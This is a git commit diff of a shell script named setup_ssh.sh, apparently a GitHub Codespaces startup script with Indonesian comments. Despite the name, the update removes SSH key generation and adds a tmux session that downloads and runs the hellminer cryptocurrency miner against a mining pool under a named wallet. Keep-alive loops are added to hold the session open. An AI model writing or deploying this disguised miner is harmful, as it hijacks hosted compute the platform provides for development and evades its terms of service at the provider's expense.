8c3fa3c699bb7dee3e6a4596332b2b1cf75e7a83
Raider-001Dev <raiderokmaliadi21@gmail.com>
2024-11-18 18:05:45 +0700

    Update setup_ssh.sh

--- setup_ssh.sh
+++ setup_ssh.sh
@@ -1,12 +1,21 @@
 #!/bin/bash
 
-# Membuat SSH Key
-ssh-keygen -t rsa -b 2048 -f /home/codespace/.ssh/id_rsa -N ""
+# Logging untuk monitoring
+LOGFILE="/var/log/codespace_startup.log"
+echo "$(date): Container startup" >> $LOGFILE
 
-# Menampilkan informasi untuk SSH
-echo "SSH Key telah dibuat."
-echo "Private Key: /home/codespace/.ssh/id_rsa"
-echo "Public Key: /home/codespace/.ssh/id_rsa.pub"
-echo "Gunakan ssh untuk menghubungkan ke Codespace: ssh codespace@<IP_ADDRESS>"
+# Pastikan tmux session "auto_run" aktif
+if ! tmux has-session -t auto_run 2>/dev/null; then
+  tmux new-session -d -s auto_run 'bash -c "
+    # Terminal 1: Menjaga koneksi tetap hidup
+    tmux send-keys -t auto_run.0 \"while true; do echo 'Menjaga koneksi tetap hidup...'; sleep 5; done\" ENTER && \
 
-# Ganti IP_ADDRESS dengan IP dari environment Codespaces
+    # Terminal 2: Menjalankan miner
+    tmux split-window -v 'bash -c \"wget https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64_avx2.tar.gz && tar -xvzf hellminer_linux64_avx2.tar.gz && ./hellminer -v -c stratum+tcp://cn.vipor.net:5040 -u RJMuH1ems9YZKZ1jDnqTtRLuQvuWmBpznQ.Device10 -p x\"' && \
+
+    # Terminal 3: Ping keep-alive
+    tmux split-window -h 'while true; do echo \"Keep-alive ping\" > /dev/null; sleep 10; done' && \
+
+    tmux select-layout tiled && tmux attach
+  "'
+fi
